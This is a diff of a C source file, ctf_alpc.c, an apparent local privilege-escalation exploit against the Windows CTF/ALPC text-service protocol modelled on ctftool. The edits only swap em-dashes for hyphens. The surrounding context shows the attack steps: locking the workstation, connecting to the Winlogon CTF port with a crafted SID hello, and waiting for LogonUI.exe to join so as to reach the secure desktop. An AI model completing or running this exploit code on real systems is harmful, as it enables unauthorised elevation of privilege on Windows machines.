@@ -1,5 +1,5 @@
 /*
- * ctf_alpc.c  —  CTF ALPC client, Winlogon desktop escalation
+ * ctf_alpc.c  -  CTF ALPC client, Winlogon desktop escalation
  *
  * 1. Lock workstation
  * 2. Connect to \BaseNamedObjects\msctf.serverWinlogon1
@@ -45,7 +45,7 @@ typedef struct _MY_OA {
     PVOID   SecurityQualityOfService;
 } MY_OA;
 
-/* PORT_MESSAGE — DDK only; define manually.
+/* PORT_MESSAGE - DDK only; define manually.
    No anonymous unions so it compiles in C89 mode. */
 typedef struct _MY_PM {
     USHORT  DataLength;
@@ -177,7 +177,7 @@ static BOOL CtfConnect(DWORD sesId) {
     attr.MaxMessageLength = sizeof(MY_MSG);
 
     /* Build connection message: CTF hello with user SID string appended.
-       ctftool "connect Winlogon sid" embeds the SID — server validates it. */
+       ctftool "connect Winlogon sid" embeds the SID - server validates it. */
     {
         wchar_t sidStr[256] = {0};
         HANDLE hTok = NULL;
@@ -210,18 +210,18 @@ static BOOL CtfConnect(DWORD sesId) {
     connSz = sizeof(conn);
 
     printf("[*] Connecting to %ls ...\n", name);
-    /* Use Flags=0 for connection (not SYNC — server does the accept/reject) */
+    /* Use Flags=0 for connection (not SYNC - server does the accept/reject) */
     st = g_Connect(&g_Port, &uname, NULL, &attr, 0,
                    NULL, &conn.hdr, &connSz, NULL, NULL, NULL);
 
     if (!NT_SUCCESS(st)) {
         printf("[-] NtAlpcConnectPort: 0x%08lx\n", (ULONG)st);
         if (st == STATUS_OBJECT_NAME_NOT_FOUND)
-            printf("    Port not found — workstation may not be locked\n");
+            printf("    Port not found - workstation may not be locked\n");
         else if ((ULONG)st == 0xC0000022UL)
             printf("    Access denied\n");
         else if ((ULONG)st == 0xC0000041UL)
-            printf("    Connection refused — server rejected our hello (wrong format?)\n");
+            printf("    Connection refused - server rejected our hello (wrong format?)\n");
         return FALSE;
     }
     printf("[+] Connected!\n");
@@ -235,7 +235,7 @@ static BOOL CtfConnect(DWORD sesId) {
     return TRUE;
 }
 
-/* ── Receive loop — CTF is server-push ──────────────────────────────────── */
+/* ── Receive loop - CTF is server-push ──────────────────────────────────── */
 /*
  * After connecting, the server pushes messages to us rather than answering
  * our requests.  We do receive-only calls (NULL send) and watch for
@@ -266,7 +266,7 @@ static BOOL RecvLoop(DWORD *pTid, DWORD *pPid, int timeoutSec) {
             printf("\n[-] Recv: 0x%08lx\n", (ULONG)st); break;
         }
 
-        /* Got a message — dump it */
+        /* Got a message - dump it */
         DWORD dlen = rsz > sizeof(MY_PM) ? rsz - (DWORD)sizeof(MY_PM) : 0;
         printf("\n[+] Server msg (%lu bytes): ", dlen);
         { DWORD i; for(i=0;i<dlen&&i<64;i++) printf("%02x ",recv.data[i]); }
@@ -471,7 +471,7 @@ int main(int argc, char **argv) {
     if (!CtfConnect(sesId)) return 1;
 
     printf("\n[*] Waiting for LogonUI.exe to join CTF session...\n");
-    printf("[*] (lock screen should already be showing — unlock to trigger LogonUI)\n\n");
+    printf("[*] (lock screen should already be showing - unlock to trigger LogonUI)\n\n");
     RecvLoop(&luTid, &luPid, 60);
     printf("\n");
 
